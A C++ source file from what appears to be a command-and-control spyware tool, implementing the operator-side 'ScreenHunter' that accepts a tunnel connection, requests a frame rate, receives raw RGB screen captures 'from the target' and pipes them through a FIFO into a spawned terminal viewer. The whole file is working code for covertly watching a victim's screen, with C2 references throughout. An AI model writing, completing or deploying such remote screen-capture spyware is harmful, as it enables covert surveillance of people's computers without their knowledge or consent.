#include "screen_hunter.hpp"

void ScreenHunter::exec_spy() {
    int rc = accept_tunnel_end();
    if (rc < 0) {
        return;
    }

    timeout_ms = static_cast<long>(((1.0 / fps_) + 5) * 1e3); // 5 second timeout range than expected

    std::cout << MAGENTA << "Time to sleep: " << timeout_ms / 1e3 << RESET;
    std::cout << MAGENTA << "fps: " << fps_ << RESET;
    
    uint32_t fps_net;
    memcpy(&fps_net, &fps_, sizeof(float));
    fps_net = htonl(fps_net);;

    rc = send(tunnel_end_socket_, &fps_net, sizeof(fps_net), 0);
    if (rc <= 0) {
        write_fifo_error("[SpyTunnel::run] Error sending the fps value" + std::string(strerror(errno)));
        return;
    }
    
    ScopedEpollFD epoll_fd;
    rc = create_epoll_fd(epoll_fd);
    if (rc < 0) {
        write_fifo_error("[SpyTunnel::run] Error creating epoll_fd" + std::string(strerror(errno)));
        return;
    }

    struct epoll_event screen_hunter_tunnel_end_event;
    screen_hunter_tunnel_end_event.data.fd = tunnel_end_socket_;
    screen_hunter_tunnel_end_event.events = EPOLLIN;
    if (epoll_ctl(epoll_fd.fd, EPOLL_CTL_ADD, tunnel_end_socket_, &screen_hunter_tunnel_end_event) < 0) {
        std::cout << MAGENTA << "tunnel_end_socket_=" << tunnel_end_socket_ << std::endl;
        write_fifo_error("[SpyTunnel::run] Error adding tunnel_end_socket_ to epoll" + std::string(strerror(errno)));
        return;
    }

    char buffer[RGB_BUFFER_SIZE] = {0};

    struct epoll_event events[2];
    while (true) {
        int nfds = epoll_wait(epoll_fd.fd, events, 2, timeout_ms);
        if (nfds < 0) {
            return;
        } else if (nfds == 0) { 
            write_fifo_error("Timeout ocurred. Terminating the screen-hunter");
            return;
        }

        for (int i=0;i<nfds;i++) {
            if (events[i].data.fd == tunnel_shutdown_fd_.fd) {
                // Server shuts down
                uint64_t u;
                read(tunnel_shutdown_fd_.fd, &u, sizeof(u));
                if (tunnel_fifo_ != -1) {
                    write(tunnel_fifo_, RESET_C2_FIFO, strlen(RESET_C2_FIFO));
                }
                return;
            } else if (events[i].data.fd == tunnel_end_socket_) {
                // Data from the target.
                int bytes_received = recv(tunnel_end_socket_, buffer, RGB_BUFFER_SIZE, 0);
                if (bytes_received <= 0) {
                    std::cout << MAGENTA << "Failed to receive from tunnel_end_socket_" << RESET;
                    write_fifo_error("[SpyTunnel::run] Was unable to receive buffer from tunnel_end_socket_");
                    return;
                }

                // Forward it to fifo and let it handle it
                rc = write(tunnel_fifo_, buffer, bytes_received);
                if (rc <= 0) {
                    close(tunnel_fifo_);
                    tunnel_fifo_ = -1;
                    write_fifo_error("[SpyTunnel::run] Was to write to tunnel_fifo_");
                    return;
                }
            }
        }
    }
}

void ScreenHunter::spawn_window() {
    std::string end_key_len_str = std::to_string(END_KEY_LEN);
    std::string res_update_key_len_str = std::to_string(RES_UPDATE_KEY_LEN);

    execlp(
        "urxvt", "urxvt", "-hold", "-name", "stierlitz_screen_hunter", 
        "-e", SCREEN_HUNTER_SCRIPT_PATH, 
        fifo_path_.c_str(), 
        END_KEY, end_key_len_str.c_str(), 
        RES_UPDATE_KEY, res_update_key_len_str.c_str(),
        (char*)NULL
    );
}

void ScreenHunter::set_fps(float __fps) {
    fps_ = __fps;
}